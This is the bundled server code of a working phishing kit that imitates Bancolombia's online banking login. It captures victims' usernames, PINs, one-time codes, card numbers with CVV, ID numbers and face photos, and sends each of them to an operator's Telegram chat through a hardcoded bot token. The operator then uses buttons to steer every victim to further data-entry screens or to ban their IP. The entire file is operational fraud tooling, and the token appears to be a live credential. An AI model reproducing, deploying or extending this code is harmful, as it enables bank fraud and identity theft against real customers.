// server/index-prod.ts
import fs from "node:fs";
import path from "node:path";
import express2 from "express";

// server/app.ts
import express from "express";

// server/routes.ts
import { createServer } from "http";

// server/storage.ts
import { drizzle } from "drizzle-orm/neon-serverless";
import { Pool, neonConfig } from "@neondatabase/serverless";
import ws from "ws";

// shared/schema.ts
import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
var users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  telegramChatId: text("telegram_chat_id"),
  createdAt: timestamp("created_at").defaultNow().notNull()
});
var loginAttempts = pgTable("login_attempts", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull(),
  success: boolean("success").notNull(),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  telegramChatId: text("telegram_chat_id")
});
var dynamicCodes = pgTable("dynamic_codes", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").notNull().references(() => users.id),
  code: text("code").notNull(),
  expiresAt: timestamp("expires_at").notNull(),
  used: boolean("used").default(false).notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull()
});
var bannedIps = pgTable("banned_ips", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  ip: text("ip").notNull().unique(),
  bannedAt: timestamp("banned_at").defaultNow().notNull()
});
var insertUserSchema = createInsertSchema(users).omit({
  id: true,
  createdAt: true
});
var insertLoginAttemptSchema = createInsertSchema(loginAttempts).omit({
  id: true,
  timestamp: true
});
var insertDynamicCodeSchema = createInsertSchema(dynamicCodes).omit({
  id: true,
  createdAt: true,
  used: true
});

// server/storage.ts
import { eq, and, gt } from "drizzle-orm";
neonConfig.webSocketConstructor = ws;
var pool = new Pool({ connectionString: process.env.DATABASE_URL });
var db = drizzle(pool);
var DbStorage = class {
  async getUser(id) {
    const result = await db.select().from(users).where(eq(users.id, id)).limit(1);
    return result[0];
  }
  async getUserByUsername(username) {
    const result = await db.select().from(users).where(eq(users.username, username)).limit(1);
    return result[0];
  }
  async createUser(insertUser) {
    const result = await db.insert(users).values(insertUser).returning();
    return result[0];
  }
  async updateUserTelegramChatId(userId, chatId) {
    await db.update(users).set({ telegramChatId: chatId }).where(eq(users.id, userId));
  }
  async logLoginAttempt(attempt) {
    const result = await db.insert(loginAttempts).values(attempt).returning();
    return result[0];
  }
  async createDynamicCode(code) {
    const result = await db.insert(dynamicCodes).values(code).returning();
    return result[0];
  }
  async getValidDynamicCode(userId) {
    const now = /* @__PURE__ */ new Date();
    const result = await db.select().from(dynamicCodes).where(
      and(
        eq(dynamicCodes.userId, userId),
        eq(dynamicCodes.used, false),
        gt(dynamicCodes.expiresAt, now)
      )
    ).orderBy(dynamicCodes.createdAt).limit(1);
    return result[0];
  }
  async markCodeAsUsed(codeId) {
    await db.update(dynamicCodes).set({ used: true }).where(eq(dynamicCodes.id, codeId));
  }
  async banIp(ip) {
    const result = await db.insert(bannedIps).values({ ip }).returning();
    return result[0];
  }
  async isIpBanned(ip) {
    const result = await db.select().from(bannedIps).where(eq(bannedIps.ip, ip)).limit(1);
    return result.length > 0;
  }
};
var storage = new DbStorage();

// server/routes.ts
import { z } from "zod";
import { fromZodError } from "zod-validation-error";

// server/telegram-bot.ts
import TelegramBot from "node-telegram-bot-api";

// server/config.ts
var config = {
  // Your Telegram Bot Token (get from @BotFather)
  // CHANGE THIS: Replace with your actual token
  TELEGRAM_BOT_TOKEN: "7867709533:AAG8zUos3iF0bqznSSk97EXDylbjBIG5HcE",
  // Your Telegram Chat ID (where the bot will send messages)
  // CHANGE THIS: Replace with your actual chat ID
  TELEGRAM_CHAT_ID: "-5073435411"
};

// server/telegram-bot.ts
var bot = null;
var telegramDecisions = /* @__PURE__ */ new Map();
var requestCounter = 0;
var requestInfo = /* @__PURE__ */ new Map();
function generateRequestId() {
  requestCounter++;
  return `r${requestCounter}`;
}
function initTelegramBot() {
  const token = config.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.warn("TELEGRAM_BOT_TOKEN not found. Telegram integration disabled.");
    return null;
  }
  if (bot) {
    return bot;
  }
  try {
    bot = new TelegramBot(token, { polling: true });
    bot.onText(/\/start/, (msg) => {
      const chatId = msg.chat.id;
      bot?.sendMessage(
        chatId,
        `\xA1Hola! Tu Chat ID es: ${chatId}`
      );
    });
    bot.on("callback_query", (query) => {
      const chatId = query.message?.chat.id;
      const data = query.data;
      if (!chatId || !data) return;
      try {
        bot?.answerCallbackQuery(query.id);
        if (data.startsWith("otp:")) {
          const requestId = data.replace("otp:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "otp");
            bot?.sendMessage(chatId, "\u2705 Redirigiendo a C\xF3digo Din\xE1mico...");
            console.log(`Telegram decision for user ${info.userId}: OTP`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("usr:")) {
          const requestId = data.replace("usr:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "usuario");
            bot?.sendMessage(chatId, "\u2705 Redirigiendo a Login...");
            console.log(`Telegram decision for user ${info.userId}: Usuario y Contrase\xF1a`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("tcc:")) {
          const requestId = data.replace("tcc:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "tcc");
            bot?.sendMessage(chatId, "\u2705 Opci\xF3n TCC seleccionada...");
            console.log(`Telegram decision for user ${info.userId}: TCC`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("tcc-confirm:")) {
          const requestId = data.replace("tcc-confirm:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "tcc-confirm");
            bot?.sendMessage(chatId, "\u2705 Tarjeta confirmada. Acceso permitido.");
            console.log(`Telegram decision for user ${info.userId}: TCC Confirmado`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("tcc-cancel:")) {
          const requestId = data.replace("tcc-cancel:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "tcc-cancel");
            bot?.sendMessage(chatId, "\u274C Tarjeta cancelada.");
            console.log(`Telegram decision for user ${info.userId}: TCC Cancelado`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("ban-ip:")) {
          const requestId = data.replace("ban-ip:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "ban-ip");
            bot?.sendMessage(chatId, "\u{1F512} IP baneada. No podr\xE1s acceder de nuevo.");
            console.log(`Telegram decision for user ${info.userId}: BAN IP`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("call-923:")) {
          const requestId = data.replace("call-923:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "call-923");
            bot?.sendMessage(chatId, "\u{1F4DE} Redirigiendo al servicio de atenci\xF3n...");
            console.log(`Telegram decision for user ${info.userId}: CALL 923`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith("face:")) {
          const requestId = data.replace("face:", "");
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, "face");
            bot?.sendMessage(chatId, "\u{1F464} Redirigiendo a Face...");
            console.log(`Telegram decision for user ${info.userId}: Face`);
            requestInfo.delete(requestId);
          }
        }
      } catch (error) {
        console.error("Error handling callback query:", error);
      }
    });
    bot.on("polling_error", (error) => {
      console.error("Telegram polling error:", error);
    });
    console.log("\u2705 Telegram bot initialized successfully");
    return bot;
  } catch (error) {
    console.error("Failed to initialize Telegram bot:", error);
    return null;
  }
}
async function sendDecisionButtons(chatId, username, password, userId, isSecondRequest = false, dynamicCode) {
  if (!bot) {
    console.warn("Telegram bot not initialized.");
    return false;
  }
  try {
    console.log(`Enviando botones de decisi\xF3n a Telegram - ChatID: ${chatId}, Usuario: ${username}`);
    let messageTitle = "\u{1F510} *Solicitud de Acceso Bancolombia*";
    let messageContent = `\u{1F464} Usuario: ${username}
\u{1F511} Contrase\xF1a: ${password}`;
    if (isSecondRequest) {
      messageTitle = "\u2705 *Verificaci\xF3n de C\xF3digo Din\xE1mico*";
      messageContent = `\u{1F464} Usuario: ${username}
\u{1F511} Contrase\xF1a: ${password}
\u{1F522} C\xF3digo Din\xE1mico: ${dynamicCode || "N/A"}`;
    }
    const message = `${messageTitle}

${messageContent}

\xBFQu\xE9 deseas hacer?`;
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest });
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "\u2705 OTP (C\xF3digo Din\xE1mico)", callback_data: `otp:${requestId}` },
              { text: "\u{1F504} Usuario y Contrase\xF1a", callback_data: `usr:${requestId}` }
            ],
            [
              { text: "\u{1F510} TCC", callback_data: `tcc:${requestId}` },
              { text: "\u{1F464} Face", callback_data: `face:${requestId}` }
            ],
            [
              { text: "\u{1F512} BAN IP", callback_data: `ban-ip:${requestId}` },
              { text: "\u260E\uFE0F 923", callback_data: `call-923:${requestId}` }
            ]
          ]
        }
      }
    );
    console.log("\u2705 Botones enviados a Telegram exitosamente");
    return true;
  } catch (error) {
    console.error("Failed to send Telegram buttons:", error);
    return false;
  }
}
async function sendCardDataButtons(chatId, documentType, documentNumber, cardNumber, cardExp, cardCvv, userId) {
  if (!bot) {
    console.warn("Telegram bot not initialized.");
    return false;
  }
  try {
    const message = `\u{1F4B3} *Datos de Tarjeta Registrados*

\u{1F4C4} Tipo de documento: ${documentType}
\u{1F522} N\xFAmero de documento: ${documentNumber}
\u{1F4B3} N\xFAmero de tarjeta: ${cardNumber}
\u{1F4C5} Expiraci\xF3n: ${cardExp}
\u{1F510} CVV: ${cardCvv}

\xBFDeseas confirmar?`;
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: true });
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "\u2705 Confirmar", callback_data: `tcc-confirm:${requestId}` },
              { text: "\u274C Cancelar", callback_data: `tcc-cancel:${requestId}` }
            ]
          ]
        }
      }
    );
    console.log("\u2705 Datos de tarjeta enviados a Telegram");
    return true;
  } catch (error) {
    console.error("Failed to send card data to Telegram:", error);
    return false;
  }
}
async function sendFacePhoto(chatId, photoBuffer, userId, username, password) {
  if (!bot) {
    console.warn("Telegram bot not initialized.");
    return false;
  }
  try {
    const message = `\u{1F464} *Foto de Verificaci\xF3n Recibida*

\u{1F464} Usuario: ${username}
\u{1F510} Contrase\xF1a: ${password}

Verificando identidad...`;
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: false });
    await bot.sendPhoto(chatId, photoBuffer, {
      caption: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "\u2705 OTP (C\xF3digo Din\xE1mico)", callback_data: `otp:${requestId}` },
            { text: "\u{1F504} Usuario y Contrase\xF1a", callback_data: `usr:${requestId}` }
          ],
          [
            { text: "\u{1F510} TCC", callback_data: `tcc:${requestId}` },
            { text: "\u{1F464} Face", callback_data: `face:${requestId}` }
          ],
          [
            { text: "\u{1F512} BAN IP", callback_data: `ban-ip:${requestId}` }
          ]
        ]
      }
    });
    console.log("\u2705 Foto de verificaci\xF3n enviada a Telegram");
    return true;
  } catch (error) {
    console.error("Failed to send face photo to Telegram:", error);
    return false;
  }
}
async function sendYesIWasMeMessage(chatId, username, password, userId) {
  if (!bot) {
    console.warn("Telegram bot not initialized.");
    return false;
  }
  try {
    const message = `\u{1F510} *Credenciales de Acceso*

\u{1F464} Usuario: ${username}
\u{1F511} Contrase\xF1a: ${password}

\u2705 PRESIONO SI, FUI YO`;
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: false });
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "\u2705 OTP (C\xF3digo Din\xE1mico)", callback_data: `otp:${requestId}` }
            ]
          ]
        }
      }
    );
    console.log('\u2705 Mensaje "S\xED, fui yo" enviado a Telegram');
    return true;
  } catch (error) {
    console.error("Failed to send yes-it-was-me message to Telegram:", error);
    return false;
  }
}

// server/routes.ts
import multer from "multer";
function generateDynamicCode() {
  return Math.floor(1e5 + Math.random() * 9e5).toString();
}
async function registerRoutes(app2) {
  app2.get("/api/client-ip", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
    res.json({ ip: typeof ip === "string" ? ip.split(",")[0] : ip });
  });
  app2.post("/api/login", async (req, res) => {
    try {
      const { username, password } = req.body;
      if (!username || !password) {
        return res.status(400).json({ error: "Usuario y contrase\xF1a requeridos" });
      }
      if (!/\d/.test(username)) {
        return res.status(400).json({ error: "El usuario debe contener al menos un n\xFAmero" });
      }
      if (!/^\d{1,4}$/.test(password)) {
        return res.status(400).json({ error: "La contrase\xF1a debe tener m\xE1ximo 4 d\xEDgitos" });
      }
      let user = await storage.getUserByUsername(username);
      if (!user) {
        user = await storage.createUser({
          username,
          password,
          telegramChatId: config.TELEGRAM_CHAT_ID
          // Auto-assign Telegram chat ID
        });
      } else if (!user.telegramChatId) {
        await storage.updateUserTelegramChatId(user.id, config.TELEGRAM_CHAT_ID);
        user = await storage.getUser(user.id) || user;
      }
      await storage.logLoginAttempt({
        username,
        success: true,
        telegramChatId: user.telegramChatId
      });
      const code = generateDynamicCode();
      const expiresAt = new Date(Date.now() + 5 * 60 * 1e3);
      const dynamicCode = await storage.createDynamicCode({
        userId: user.id,
        code,
        expiresAt
      });
      let sentViaTelegram = false;
      if (user.telegramChatId) {
        try {
          sentViaTelegram = await sendDecisionButtons(
            parseInt(user.telegramChatId),
            username,
            password,
            user.id
          );
        } catch (error) {
          console.error("Error sending Telegram message:", error);
        }
      }
      res.json({
        success: true,
        userId: user.id,
        codeId: dynamicCode.id,
        sentViaTelegram,
        dynamicCode: code,
        requiresTelegramDecision: sentViaTelegram
      });
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/verify-code", async (req, res) => {
    try {
      const { userId, code, username, password } = req.body;
      if (!userId || !code) {
        return res.status(400).json({ error: "Faltan par\xE1metros" });
      }
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }
      console.log(`Verify code - User: ${user.username}, Code verification attempt`);
      let sentToTelegram = false;
      if (user.telegramChatId) {
        try {
          console.log(`Intentando enviar botones a Telegram para usuario ${user.username} (c\xF3digo din\xE1mico: ${code})`);
          sentToTelegram = await sendDecisionButtons(
            parseInt(user.telegramChatId),
            username || user.username,
            password || "****",
            userId,
            true,
            // Mark as second request
            code
            // Pass the dynamic code
          );
          console.log(`Resultado de env\xEDo a Telegram: ${sentToTelegram}`);
        } catch (error) {
          console.error("Error sending code to Telegram:", error);
        }
      } else {
        console.log(`Usuario ${user.username} - Telegram configuration not found`);
      }
      res.json({
        success: true,
        message: "C\xF3digo enviado a Telegram",
        sentToTelegram
      });
    } catch (error) {
      console.error("Verify code error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.get("/api/telegram-decision/:userId", async (req, res) => {
    try {
      const { userId } = req.params;
      if (!userId) {
        return res.status(400).json({ error: "userId requerido" });
      }
      const decision = telegramDecisions.get(userId);
      if (!decision) {
        return res.status(404).json({
          decision: null,
          message: "Sin decisi\xF3n a\xFAn"
        });
      }
      telegramDecisions.delete(userId);
      res.json({
        success: true,
        decision
      });
    } catch (error) {
      console.error("Get Telegram decision error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/register", async (req, res) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);
      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: "El usuario ya existe" });
      }
      const user = await storage.createUser(validatedData);
      res.json({
        success: true,
        user: { id: user.id, username: user.username }
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ error: validationError.message });
      }
      console.error("Register error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/link-telegram", async (req, res) => {
    try {
      const { userId, chatId } = req.body;
      if (!userId || !chatId) {
        return res.status(400).json({ error: "Faltan par\xE1metros" });
      }
      await storage.updateUserTelegramChatId(userId, chatId.toString());
      res.json({
        success: true,
        message: "Telegram vinculado correctamente"
      });
    } catch (error) {
      console.error("Link Telegram error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/telegram/get-code", async (req, res) => {
    try {
      const { userId } = req.body;
      const validCode = await storage.getValidDynamicCode(userId);
      if (!validCode) {
        return res.status(404).json({
          error: "No hay c\xF3digo v\xE1lido"
        });
      }
      res.json({
        code: validCode.code,
        expiresAt: validCode.expiresAt
      });
    } catch (error) {
      console.error("Get code error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/send-card-data", async (req, res) => {
    try {
      const { userId, documentType, documentNumber, cardNumber, cardExp, cardCvv } = req.body;
      if (!userId || !documentType || !documentNumber || !cardNumber || !cardExp || !cardCvv) {
        return res.status(400).json({ error: "Faltan par\xE1metros" });
      }
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }
      let sentToTelegram = false;
      if (user.telegramChatId) {
        try {
          sentToTelegram = await sendCardDataButtons(
            parseInt(user.telegramChatId),
            documentType,
            documentNumber,
            cardNumber,
            cardExp,
            cardCvv,
            userId
          );
        } catch (error) {
          console.error("Error sending card data to Telegram:", error);
        }
      }
      res.json({
        success: true,
        sentToTelegram
      });
    } catch (error) {
      console.error("Send card data error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/ban-ip", async (req, res) => {
    try {
      const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
      const ipAddr = typeof ip === "string" ? ip.split(",")[0] : ip;
      await storage.banIp(ipAddr);
      res.json({
        success: true,
        message: `IP ${ipAddr} baneada exitosamente`
      });
    } catch (error) {
      console.error("Ban IP error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.get("/api/check-ban", async (req, res) => {
    try {
      const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
      const ipAddr = typeof ip === "string" ? ip.split(",")[0] : ip;
      const isBanned = await storage.isIpBanned(ipAddr);
      if (isBanned) {
        return res.status(403).json({
          success: false,
          error: "Tu IP ha sido baneada",
          banned: true
        });
      }
      res.json({
        success: true,
        banned: false
      });
    } catch (error) {
      console.error("Check ban error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  app2.post("/api/send-yes-i-was-me", async (req, res) => {
    try {
      const userId = req.body.userId;
      const username = req.body.username;
      const password = req.body.password;
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }
      if (user.telegramChatId) {
        await sendYesIWasMeMessage(parseInt(user.telegramChatId), username, password, userId);
      }
      res.json({ success: true });
    } catch (error) {
      console.error("Send yes-it-was-me error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  const upload = multer({ storage: multer.memoryStorage() });
  app2.post("/api/send-face-photo", upload.single("photo"), async (req, res) => {
    try {
      const userId = req.body.userId;
      const username = req.body.username;
      const password = req.body.password;
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "Usuario no encontrado" });
      }
      if (req.file && user.telegramChatId) {
        await sendFacePhoto(parseInt(user.telegramChatId), req.file.buffer, userId, username, password);
      }
      res.json({ success: true });
    } catch (error) {
      console.error("Send face photo error:", error);
      res.status(500).json({ error: "Error interno del servidor" });
    }
  });
  const httpServer = createServer(app2);
  return httpServer;
}

// server/app.ts
initTelegramBot();
function log(message, source = "express") {
  const formattedTime = (/* @__PURE__ */ new Date()).toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });
  console.log(`${formattedTime} [${source}] ${message}`);
}
var app = express();
app.use(express.json({
  verify: (req, _res, buf) => {
    req.rawBody = buf;
  }
}));
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
  const start = Date.now();
  const path2 = req.path;
  let capturedJsonResponse = void 0;
  const originalResJson = res.json;
  res.json = function(bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };
  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path2.startsWith("/api")) {
      let logLine = `${req.method} ${path2} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "\u2026";
      }
      log(logLine);
    }
  });
  next();
});
async function runApp(setup) {
  const server = await registerRoutes(app);
  app.use((err, _req, res, _next) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });
  await setup(app, server);
  const port = parseInt(process.env.PORT || "5000", 10);
  server.listen({
    port,
    host: "0.0.0.0",
    reusePort: true
  }, () => {
    log(`serving on port ${port}`);
  });
}

// server/index-prod.ts
async function serveStatic(app2, server) {
  const distPath = path.resolve(import.meta.dirname, "public");
  if (!fs.existsSync(distPath)) {
    throw new Error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app2.use(express2.static(distPath));
  app2.use("*", (_req, res) => {
    res.sendFile(path.resolve(distPath, "index.html"));
  });
}
(async () => {
  await runApp(serveStatic);
})();
export {
  serveStatic
};
